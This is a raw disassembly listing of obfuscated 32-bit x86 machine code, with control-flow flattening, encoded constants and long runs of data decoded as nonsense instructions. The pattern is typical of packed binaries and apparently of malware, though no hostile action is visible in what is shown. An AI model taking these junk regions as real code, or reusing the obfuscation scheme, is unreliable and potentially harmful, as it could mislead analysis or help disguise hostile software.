  40e270:	xor    DWORD PTR [esi-0x54],esi
  40e273:	lahf   
  40e274:	mov    BYTE PTR [edi+eiz*2],ah
  40e277:	fs dec esp
  40e279:	xchg   esi,eax
  40e27a:	push   esp
  40e27b:	push   0xffffffc7
  40e27d:	inc    ebp
  40e27e:	add    al,cl
  40e280:	pop    ds
  40e281:	retf   
  40e282:	mov    DWORD PTR [ebp-0x18],eax
  40e285:	mov    edi,DWORD PTR [ebp+0x8]
  40e288:	inc    DWORD PTR ds:0x43368b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x433763,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x4337ab
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433717,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43368b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x433757,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43371f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43369b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43379f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x4337ab,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x43375f,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43379b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x433757,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x4336d3,0x4336df
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x433727,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x433753,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x433757,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433683,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433683,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433717,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433683,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x43372f,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x4337ab
  40e3da:	and    DWORD PTR ds:0x43368b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x4336e3,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433793
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	push   0xffffffa5
  40e416:	out    dx,eax
  40e417:	add    edx,DWORD PTR [esi]
  40e419:	cwde   
  40e41a:	jle    0x40e49a
  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e3a6
  40e421:	and    bl,ah
  40e423:	ss (bad) 
  40e425:	in     al,dx
  40e426:	int    0xa0
  40e428:	xor    DWORD PTR [esi-0x77],0x99e527b1
  40e42f:	push   esp
  40e430:	popa   
  40e431:	sar    dh,1
  40e433:	cli    
  40e434:	cmp    eax,0x8086281e
  40e439:	or     DWORD PTR [eax],ebx
  40e43b:	fdiv   QWORD PTR [esi+esi*2+0x590a6629]
  40e442:	jb     0x40e418
  40e444:	push   eax
  40e445:	jl     0x40e45e
  40e447:	icebp  
  40e448:	mov    ecx,0xc16610c4
  40e44d:	dec    ecx
  40e44e:	call   0x509b9938
  40e453:	mov    dh,BYTE PTR [ecx-0x68]
  40e456:	push   eax
  40e457:	add    DWORD PTR [eax],edi
  40e459:	or     eax,DWORD PTR [eax]
  40e45b:	mov    al,ds:0xe7aa6c6d
  40e460:	mov    dl,0xb2
  40e462:	fwait
  40e463:	or     BYTE PTR [esi+0x74],dl
  40e466:	inc    ebx
  40e467:	push   es
  40e468:	dec    esp
  40e469:	jns    0x40e430
  40e46b:	mov    eax,ds:0x98a028bf
  40e470:	sahf   
  40e471:	push   ds
  40e472:	mov    cl,0x5a
  40e474:	pusha  
  40e475:	push   ebx
  40e476:	inc    esi
  40e477:	jge    0x40e41f
  40e479:	cmp    dh,ch
  40e47b:	xor    eax,0xb65fd19d
  40e480:	lea    ecx,[edi]
  40e482:	jge    0x40e488
  40e484:	sbb    al,0x81
  40e486:	mov    ah,BYTE PTR [edx+0x5c]
  40e489:	jno    0x40e4dd
  40e48b:	(bad)  
  40e48d:	push   0xffffffc8
  40e48f:	repnz cli 
  40e491:	sbb    al,0x25
  40e493:	enter  0x3012,0x5
  40e497:	adc    bl,cl
  40e499:	clc    
  40e49a:	fimul  WORD PTR [ecx-0x1d]
  40e49d:	and    eax,0x2cf6acaa
  40e4a2:	stos   DWORD PTR es:[edi],eax
  40e4a3:	mov    bl,0x35
  40e4a5:	and    bl,BYTE PTR [ebx-0x47a6b65c]
  40e4ab:	mov    ds:0x4338f75c,al
  40e4b0:	cs inc edi
  40e4b2:	mov    ebx,0x548b7ac9
  40e4b7:	into   
  40e4b8:	pop    esp
  40e4b9:	aam    0xc7
  40e4bb:	mov    esi,0xaf0afa94
  40e4c0:	sbb    esi,edi
  40e4c2:	or     ebp,DWORD PTR [edi]
  40e4c4:	stos   BYTE PTR es:[edi],al
  40e4c5:	daa    
  40e4c6:	fidiv  DWORD PTR [ebx]
  40e4c8:	sbb    DWORD PTR [ebx+0x12b64974],edi
  40e4ce:	dec    ebp
  40e4cf:	icebp  
  40e4d0:	and    BYTE PTR [ebp-0x76f2a78],ch
  40e4d6:	loopne 0x40e48a
  40e4d8:	rcr    BYTE PTR [edx],1
  40e4da:	das    
  40e4db:	xor    al,al
  40e4dd:	lea    ebp,[eax]
  40e4df:	add    al,0xeb
  40e4e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4e2:	add    al,0x55
  40e4e4:	call   0xe5dcb62f
  40e4e9:	sbb    eax,0xd1245478
  40e4ee:	and    dl,BYTE PTR [esi]
  40e4f0:	sbb    edi,DWORD PTR [ebx+eiz*2]
  40e4f3:	adc    DWORD PTR [ebx-0x5b],ebp
  40e4f6:	rcl    BYTE PTR [ecx-0x1a65326d],0x3f
  40e4fd:	sub    cl,BYTE PTR [esi+0x65]
  40e500:	int3   
  40e501:	push   eax
  40e502:	mov    ecx,0x1728217b
  40e507:	cwde   
  40e508:	push   0x93d23ddb
  40e50d:	mov    ch,0x23
  40e50f:	fisub  DWORD PTR [esi+ecx*2-0x62]
  40e513:	mov    ebp,eax
  40e515:	ret    
  40e516:	in     eax,dx
  40e517:	outs   dx,BYTE PTR ds:[esi]
  40e518:	mov    al,ds:0xe6f2d3cb
  40e51d:	ins    BYTE PTR es:[edi],dx
  40e51e:	mov    ecx,0xb05f02f0
  40e523:	adc    bh,BYTE PTR [esi]
  40e525:	ror    BYTE PTR [ebx],0x4f
  40e528:	clc    
  40e529:	iret   
  40e52a:	shr    DWORD PTR [ebp+0x16],1
  40e52d:	imul   esp,DWORD PTR [ebp-0x3bd626ac],0x5c4254f0
  40e537:	xchg   BYTE PTR [esi+0x2],cl
  40e53a:	mov    ds:0xf4458b21,eax
  40e53f:	or     DWORD PTR ds:0x433723,0x43376b
  40e549:	xor    eax,esi
  40e54b:	add    eax,ebx
  40e54d:	sbb    DWORD PTR ds:0x43375b,0x43372f
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0x53f261b8
  40e5b4:	mov    gs:0x7e992a43,al
  40e5ba:	jle    0x40e5ce
  40e5bc:	jg     0x40e63c
  40e5be:	jle    0x40e637
  40e5c0:	mov    bl,BYTE PTR [ecx+ecx*8-0x7cc88284]
  40e5c7:	int3   
  40e5c8:	sbb    eax,0x3b5b97c3
  40e5cd:	sub    DWORD PTR [eax+0x57],edi
  40e5d0:	inc    esp
  40e5d1:	les    ebp,FWORD PTR [esi]
  40e5d3:	push   ss
  40e5d4:	xlat   BYTE PTR ds:[ebx]
  40e5d5:	loope  0x40e566
  40e5d7:	outs   dx,DWORD PTR ds:[esi]
  40e5d8:	in     al,dx
  40e5d9:	adc    eax,0x8515605b
  40e5de:	inc    eax
  40e5df:	or     esi,ecx
  40e5e1:	mov    ebp,0x5a5a5ca1
  40e5e6:	inc    esi
  40e5e7:	xchg   ecx,eax
  40e5e8:	in     al,0xd8
  40e5ea:	sbb    esp,DWORD PTR ss:[ebx-0x33]
  40e5ee:	or     eax,0x92127f9c
  40e5f3:	mov    ah,0x53
  40e5f5:	hlt    
  40e5f6:	(bad)  
  40e5f7:	xchg   esi,eax
  40e5f8:	scas   eax,DWORD PTR es:[edi]
  40e5f9:	jmp    0x30ca:0x88ddc2c7
  40e600:	out    0x50,al
  40e602:	(bad)  
  40e603:	iret   
  40e604:	fimul  DWORD PTR [ecx+0x0]
  40e607:	clc    
  40e608:	popa   
  40e609:	in     al,0x43
  40e60b:	cld    
  40e60c:	icebp  
  40e60d:	jmp    0x36d18e8a
  40e612:	into   
  40e613:	popf   
  40e614:	enter  0x4e3,0x49
  40e618:	cmc    
  40e619:	popa   
  40e61a:	xor    ah,ah
  40e61c:	(bad)  
  40e61d:	or     ecx,DWORD PTR [ebx+eiz*1]
  40e620:	fidiv  WORD PTR [ebx+0x328b69a2]
  40e626:	xor    eax,0x2c573f50
  40e62b:	xor    bl,cl
  40e62d:	inc    edx
  40e62e:	leave  
  40e62f:	cld    
  40e630:	repz repnz inc eax
  40e633:	jbe    0x40e66d
  40e635:	push   ds
  40e636:	jmp    0x40e659
  40e638:	push   ss
  40e639:	jne    0x40e61b
  40e63b:	in     al,0xf5
  40e63d:	jmp    0x8429:0x7760e922
  40e644:	xchg   esi,eax
  40e645:	(bad)  
  40e646:	loope  0x40e6b6
  40e648:	aad    0x2d
  40e64a:	lea    ecx,ds:0x5349e8f7
  40e650:	push   ds
  40e651:	mov    ah,0x46
  40e653:	ret    
  40e654:	in     al,0xf5
  40e656:	mov    bl,dl
  40e658:	and    al,0xa9
  40e65a:	loopne 0x40e67a
  40e65c:	ret    
  40e65d:	mov    ebp,DWORD PTR [bx+di]
  40e660:	sbb    BYTE PTR [ecx+0x58d43240],dh
  40e666:	call   0x7895ddca
  40e66b:	pop    eax
  40e66c:	call   0x529ebca1
  40e671:	jmp    0x3ff:0x77092995
  40e678:	dec    ebp
  40e679:	rcr    BYTE PTR [edx-0x8],cl
  40e67c:	or     edx,DWORD PTR [esi+esi*4]
  40e67f:	ins    BYTE PTR es:[edi],dx
  40e680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e682:	inc    esp
  40e683:	mov    dl,0x1e
  40e685:	out    dx,eax
  40e686:	mov    WORD PTR [ecx],cs
  40e688:	lds    ebp,FWORD PTR [edi-0x6ac3be7c]
  40e68e:	cdq    
  40e68f:	mov    edx,0x5b70ff71
  40e694:	inc    BYTE PTR [edi]
  40e696:	cmp    dh,BYTE PTR [edi]
  40e698:	xor    esp,ebx
  40e69a:	or     ebp,DWORD PTR [eax-0x4d]
  40e69d:	mov    cl,bl
  40e69f:	ins    DWORD PTR es:[edi],dx
  40e6a0:	mov    dl,0xc
  40e6a2:	dec    esp
  40e6a3:	pop    eax
  40e6a4:	mov    DWORD PTR [edi-0x79aded97],edi
  40e6aa:	or     al,0x9c
  40e6ac:	test   al,0xf2
  40e6ae:	dec    ecx
  40e6af:	dec    edi
  40e6b0:	inc    ecx
  40e6b1:	dec    esi
  40e6b2:	stc    
  40e6b3:	xor    DWORD PTR [eax-0x15674f85],0x1dd40219
  40e6bd:	xchg   esp,eax
  40e6be:	xchg   ebx,eax
  40e6bf:	in     al,0x5a
  40e6c1:	outs   dx,BYTE PTR ds:[esi]
  40e6c2:	mov    al,0x5
  40e6c4:	retf   0xfe34
  40e6c7:	and    eax,0xe339074b
  40e6cc:	inc    edx
  40e6cd:	or     al,0x8d
  40e6cf:	icebp  
  40e6d0:	push   esp
  40e6d1:	add    ch,ch
  40e6d3:	mov    al,ds:0x99b54fc1
  40e6d8:	sub    BYTE PTR [eax+0x3b34a172],ch
  40e6de:	inc    ecx
  40e6df:	add    BYTE PTR [ecx+0x458b0845],cl
  40e6e5:	in     al,dx
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx-0x48e7e26c]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e75e
  40e704:	mov    cs,ebx
  40e706:	pop    esp
  40e707:	mov    edx,DWORD PTR [esp+ebp*2-0x6]
  40e70b:	push   ax
  40e70d:	cmp    eax,0xcf902d9f
  40e712:	add    ebx,DWORD PTR ds:0x4e1c818
  40e718:	les    ebx,FWORD PTR [ecx+0x6a1cbce3]
  40e71e:	adc    BYTE PTR [esi-0x1a],0x53
  40e722:	mov    dl,0x35
  40e724:	pop    ds
  40e725:	ja     0x40e6a7
  40e727:	inc    esi
  40e728:	add    ebx,DWORD PTR [ecx]
  40e72a:	push   0x5007c067
  40e72f:	in     eax,0x12
  40e731:	daa    
  40e732:	adc    al,al
  40e734:	sub    DWORD PTR [edx+eiz*4],esp
  40e737:	jl     0x40e70b
  40e739:	ret    
  40e73a:	push   esp
  40e73b:	fs cdq 
  40e73d:	jb     0x40e7af
  40e73f:	out    dx,al
  40e740:	cmp    al,0x6b
  40e742:	jne    0x40e6f6
  40e744:	sub    eax,0x136f1c79
  40e749:	jp     0x40e70f
  40e74b:	xor    al,0x44
  40e74d:	xor    eax,0x1d0129fa
  40e752:	cmp    edi,ecx
  40e754:	ror    DWORD PTR [ebx-0x3f6161d4],cl
  40e75a:	xchg   edx,eax
  40e75b:	cmp    BYTE PTR [esp+edi*4-0x6b0fb891],dl
  40e762:	pop    ecx
  40e763:	mov    DWORD PTR [esi+ebx*8],esp
  40e766:	mov    esi,0xe6fbab2a
  40e76b:	xchg   esp,eax
  40e76c:	xchg   esp,eax
  40e76d:	xor    ah,cl
  40e76f:	mov    ds:0x73aee1a,eax
  40e774:	jb     0x40e700
  40e776:	es std 
  40e778:	inc    ecx
  40e779:	lea    edx,[eax]
  40e77b:	mov    ebx,0x40068b30
  40e780:	retw   0x21e1
  40e784:	je     0x40e714
  40e786:	mov    bl,0x68
  40e788:	sub    esi,DWORD PTR [esi]
  40e78a:	ror    BYTE PTR [edx+0x72791244],cl
  40e790:	add    DWORD PTR [ebp+esi*2+0x16465fee],eax
  40e797:	jmp    0x590c:0x79265534
  40e79e:	mov    ch,0xd2
  40e7a0:	push   edi
  40e7a1:	sbb    BYTE PTR [esi+0x5b],dl
  40e7a4:	jbe    0x40e77c
  40e7a6:	inc    ebp
  40e7a7:	dec    ebx
  40e7a8:	or     BYTE PTR [esi+0xe],dl
  40e7ab:	sbb    eax,0x2522db78
  40e7b0:	push   ecx
  40e7b1:	(bad)  
  40e7b2:	push   ebp
  40e7b3:	mov    ah,0xbf
  40e7b5:	cdq    
  40e7b6:	inc    ebx
  40e7b7:	cmc    
  40e7b8:	not    DWORD PTR [ebp+eiz*8+0x67]
  40e7bc:	enter  0xe0d5,0xe6
  40e7c0:	cmp    eax,0x3dfdc4fe
  40e7c5:	test   ebp,0x16ff5e70
  40e7cb:	test   eax,0xdfd9fae1
  40e7d0:	jmp    0xe9e57632
  40e7d5:	xor    BYTE PTR gs:[edx-0x46abbfb5],ch
  40e7dc:	dec    esp
  40e7dd:	or     edx,DWORD PTR [edx+0x16]
  40e7e0:	loope  0x40e78f
  40e7e2:	gs (bad) 
  40e7e4:	xor    DWORD PTR [esi+0x2],esi
  40e7e7:	mov    ss,WORD PTR [eax-0x4c323f10]
  40e7ed:	pop    es
  40e7ee:	test   al,0xcc
  40e7f0:	mov    ?,WORD PTR [edi+esi*2-0x6ad074f1]
  40e7f7:	mov    dl,0x3
  40e7f9:	iret   
  40e7fa:	leave  
  40e7fb:	test   BYTE PTR [ecx+ecx*8+0x657ae5],dl
  40e802:	in     eax,dx
  40e803:	sbb    eax,0x1f268f25
  40e808:	pop    ebp
  40e809:	xor    eax,DWORD PTR [eax+0x19de6df9]
  40e80f:	mov    WORD PTR [ecx+0x32d35946],gs
  40e815:	or     eax,0x481469e4
  40e81a:	mov    DWORD PTR [ecx-0x76a12835],eax
  40e820:	inc    ebp
  40e821:	cld    
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e7fd
  40e854:	jl     0x40e892
  40e856:	ret    0xa7e2
  40e859:	jle    0x40e8d9
  40e85b:	adc    bh,BYTE PTR [edi+0x7e]
  40e85e:	jle    0x40e8d1
  40e860:	jne    0x40e898
  40e862:	ficom  DWORD PTR [edi]
  40e864:	ficomp WORD PTR [ebp-0x71]
  40e867:	mov    WORD PTR [ecx+0x65],es
  40e86a:	xchg   edx,eax
  40e86b:	es call 0xbd3cec34
  40e871:	sub    bl,bl
  40e873:	sbb    dh,BYTE PTR [edx+0x7f]
  40e876:	das    
  40e877:	mov    edi,0x3b2c1dc5
  40e87c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e87d:	push   eax
  40e87e:	outs   dx,DWORD PTR ds:[esi]
  40e87f:	call   0x197a34d8
  40e884:	jle    0x40e82d
  40e886:	cmp    al,0x39
  40e888:	mov    eax,ds:0xb18713fb
  40e88d:	dec    esp
  40e88e:	sub    BYTE PTR [edx+0x6a74bd09],bh
  40e894:	sbb    DWORD PTR [eax-0x1b],ebp
  40e897:	cmp    ch,al
  40e899:	icebp  
  40e89a:	loop   0x40e82d
  40e89c:	leave  
  40e89d:	js     0x40e87f
  40e89f:	dec    edx
  40e8a0:	jns    0x40e831
  40e8a2:	aad    0xda
  40e8a4:	push   ds
  40e8a5:	loop   0x40e850
  40e8a7:	popa   
  40e8a8:	xchg   esp,eax
  40e8a9:	mov    ah,BYTE PTR [esi]
  40e8ab:	and    ebp,DWORD PTR [edi]
  40e8ad:	(bad)  
  40e8ae:	lods   al,BYTE PTR ds:[esi]
  40e8af:	xlat   BYTE PTR ds:[ebx]
  40e8b0:	mov    bh,0xbb
  40e8b2:	pop    ds
  40e8b3:	in     eax,dx
  40e8b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8b5:	je     0x40e8e3
  40e8b7:	mov    WORD PTR [esp+ebp*2-0x2114b1da],?
  40e8be:	imul   edx,DWORD PTR ds:0xc62d30,0x7aec600e
  40e8c8:	inc    eax
  40e8c9:	nop
  40e8ca:	lock adc al,0xf6
  40e8cd:	inc    esi
  40e8ce:	xor    edi,DWORD PTR [esi]
  40e8d0:	and    al,0x42
  40e8d2:	push   0xffffff81
  40e8d4:	in     al,dx
  40e8d5:	sbb    al,0xd1
  40e8d7:	mov    dl,0xa6
  40e8d9:	fidivr DWORD PTR ds:0x7f043d7f
  40e8df:	call   0x26a3:0x1ae50b5d
  40e8e6:	sub    eax,0x127f2b
  40e8eb:	xchg   edi,eax
  40e8ec:	ret    0xc125
  40e8ef:	ffreep st(5)
  40e8f1:	ds iret 
  40e8f3:	dec    ebx
  40e8f4:	rol    BYTE PTR [edi+esi*1],0xbd
  40e8f8:	push   ebx
  40e8f9:	mov    cl,0x3d
  40e8fb:	adc    eax,0x7447d83f
  40e900:	cmc    
  40e901:	add    edi,edx
  40e903:	adc    eax,0x3c00ce14
  40e908:	mov    esp,0xe052a847
  40e90d:	jne    0x40e959
  40e90f:	pop    esp
  40e910:	out    dx,al
  40e911:	xchg   esp,eax
  40e912:	or     DWORD PTR [eax],0xffffffe7
  40e915:	jl     0x40e8d1
  40e917:	xor    bl,cl
  40e919:	or     al,BYTE PTR [esi]
  40e91b:	enter  0x13bc,0xe9
  40e91f:	loop   0x40e8ab
  40e921:	sar    DWORD PTR [edx],0xda
  40e924:	aas    
  40e925:	add    al,0x12
  40e927:	sar    DWORD PTR [edx-0x18],0xdb
  40e92b:	ins    BYTE PTR es:[edi],dx
  40e92c:	int    0xd0
  40e92e:	pop    edi
  40e92f:	xchg   ebp,eax
  40e930:	xor    ah,BYTE PTR [esi+eiz*4-0x27287cdb]
  40e937:	mov    WORD PTR [ecx+eiz*1+0x54],ss
  40e93b:	jnp    0x40e908
  40e93d:	fstp   TBYTE PTR [edx+eiz*8+0x23157ca6]
  40e944:	or     edx,eax
  40e946:	xchg   edi,eax
  40e947:	aad    0xe7
  40e949:	arpl   WORD PTR [eax-0x7952b698],dx
  40e94f:	mov    dh,0x9d
  40e951:	data16 xor cl,BYTE PTR [edx-0x3d323392]
  40e958:	scas   al,BYTE PTR es:[edi]
  40e959:	(bad)  
  40e95a:	into   
  40e95b:	sahf   
  40e95c:	sbb    DWORD PTR [edx+0x51],esi
  40e95f:	fimul  WORD PTR [ecx]
  40e961:	mov    esp,0x4163ada2
  40e966:	inc    edi
  40e967:	xor    BYTE PTR [eax-0x39a4207a],bl
  40e96d:	pop    ebp
  40e96e:	adc    edi,0xffffffd9
  40e971:	adc    BYTE PTR [esi-0x57e56351],0xcc
  40e978:	mov    cl,0x65
  40e97a:	(bad)  
  40e97b:	jne    0x40e2bf
  40e981:	mov    eax,DWORD PTR [ebp+0xc]
  40e984:	pop    edi
  40e985:	xor    eax,esi
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0x7252881d
  40e99c:	loope  0x40e924
  40e99e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e99f:	jle    0x40ea1f
  40e9a1:	adc    bh,BYTE PTR [edi+0x7e]
  40e9a4:	jle    0x40e9dc
  40e9a6:	bnd call 0x62fbe52a
  40e9ac:	jae    0x40ea26
  40e9ae:	jnp    0x40e967
  40e9b0:	out    dx,eax
  40e9b1:	iret   
  40e9b2:	dec    ebx
  40e9b3:	fs popa 
  40e9b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9b6:	scas   eax,DWORD PTR es:[edi]
  40e9b7:	mov    dl,0xa3
  40e9b9:	xchg   esp,eax
  40e9ba:	adc    DWORD PTR [esi+0x28],edi
  40e9bd:	aaa    
  40e9be:	adc    BYTE PTR [esi+0x33c5db86],dl
  40e9c4:	mov    ds:0xe940796b,al
  40e9c9:	das    
  40e9ca:	mov    esp,0xb5286c97
  40e9cf:	lahf   
  40e9d0:	xor    eax,0x48cdb91c
  40e9d5:	jne    0x40e9c4
  40e9d7:	clc    
  40e9d8:	sub    ch,BYTE PTR [esi+eax*8+0x48]
  40e9dc:	sbb    esi,edx
  40e9de:	mov    bl,0x66
  40e9e0:	jbe    0x40e9b4
  40e9e2:	sub    al,0xb
  40e9e4:	mov    dl,BYTE PTR [ebp-0x39]
  40e9e7:	mov    bh,BYTE PTR [ebx-0x4]
  40e9ea:	std    
  40e9eb:	leave  
  40e9ec:	sbb    esi,edx
  40e9ee:	push   edi
  40e9ef:	and    al,0xab
  40e9f1:	mov    esp,cs
  40e9f3:	mov    esp,0x2332f0e
  40e9f8:	loop   0x40ea5e
  40e9fa:	arpl   ax,di
  40e9fc:	je     0x40ea0f
  40e9fe:	jnp    0x40ea5c
  40ea00:	push   ebp
  40ea01:	sbb    BYTE PTR [edx],bh
  40ea03:	(bad)  
  40ea04:	dec    edx
  40ea05:	dec    esi
  40ea06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea07:	or     eax,0x2578e7d7
  40ea0c:	inc    ebp
  40ea0d:	cmp    al,0x45
  40ea0f:	into   
  40ea10:	push   esi
  40ea11:	mov    al,0x4b
  40ea13:	in     al,dx
  40ea14:	aad    0x2
  40ea16:	xor    al,0x46
  40ea18:	dec    ebx
  40ea19:	adc    al,0xc5
  40ea1b:	aas    
  40ea1c:	aaa    
  40ea1d:	out    0x23,eax
  40ea1f:	hlt    
  40ea20:	nop
  40ea21:	add    eax,0x8166249d
  40ea26:	cmp    eax,0x1732e34
  40ea2b:	sbb    al,0x22
  40ea2d:	ds mov dh,0x42
  40ea30:	jmp    0x3471:0xf674
  40ea36:	and    al,0xd1
  40ea38:	enter  0x757e,0x41
  40ea3c:	mov    edx,0x633f49d3
  40ea41:	mov    BYTE PTR [ebx],ch
  40ea43:	ret    0x5397
  40ea46:	jge    0x40ea72
  40ea48:	jmp    0x40ea47
  40ea4a:	sbb    esi,DWORD PTR [ecx-0x15]
  40ea4d:	and    DWORD PTR [edi+0xab42e3a],edx
  40ea53:	scas   eax,DWORD PTR es:[edi]
  40ea54:	jno    0x40ea41
  40ea56:	test   esi,0xb7f150c8
  40ea5c:	pop    esi
  40ea5d:	xchg   ebp,eax
  40ea5e:	mov    ebp,0x6b5334a
  40ea63:	pop    ebx
  40ea64:	mov    WORD PTR [esi],fs
  40ea66:	inc    eax
  40ea67:	jno    0x40ea84
  40ea69:	push   ebx
  40ea6a:	test   DWORD PTR [eax-0x6e],eax
  40ea6d:	nop
  40ea6e:	mov    ds:0x49ab239d,eax
  40ea73:	jge    0x40ea80
  40ea75:	sbb    esi,ebx
  40ea77:	icebp  
  40ea78:	icebp  
  40ea79:	ror    BYTE PTR [ecx-0x4976c80c],0xbc
  40ea80:	adc    edx,DWORD PTR [eax-0x40]
  40ea83:	addr16 and ebp,esi
  40ea86:	adc    cl,BYTE PTR [edi+0x2f]
  40ea89:	sub    bh,BYTE PTR [esi+0x7c]
  40ea8c:	push   esi
  40ea8d:	call   0xf9b487bd
  40ea92:	mov    es,esp
  40ea94:	pop    esp
  40ea95:	adc    esi,edi
  40ea97:	fmul   QWORD PTR [eax+0x22]
  40ea9a:	stos   DWORD PTR es:[edi],eax
  40ea9b:	xchg   edx,eax
  40ea9c:	or     cl,BYTE PTR [ebp-0x39ecdcfc]
  40eaa2:	xchg   DWORD PTR [esi-0x66cde101],ebx
  40eaa8:	inc    eax
  40eaa9:	ins    BYTE PTR es:[edi],dx
  40eaaa:	and    al,0x39
  40eaac:	dec    edi
  40eaad:	xchg   edx,eax
  40eaae:	aaa    
  40eaaf:	test   esi,0xfe0c689c
  40eab5:	or     edx,eax
  40eab7:	xchg   ecx,ebx
  40eab9:	jno    0x40ea72
  40eabb:	cmp    al,0x92
  40eabd:	and    BYTE PTR [esi-0x3cfc25ee],al
  40eac3:	pop    ebx
  40eac4:	leave  
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433713,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433713,0x0
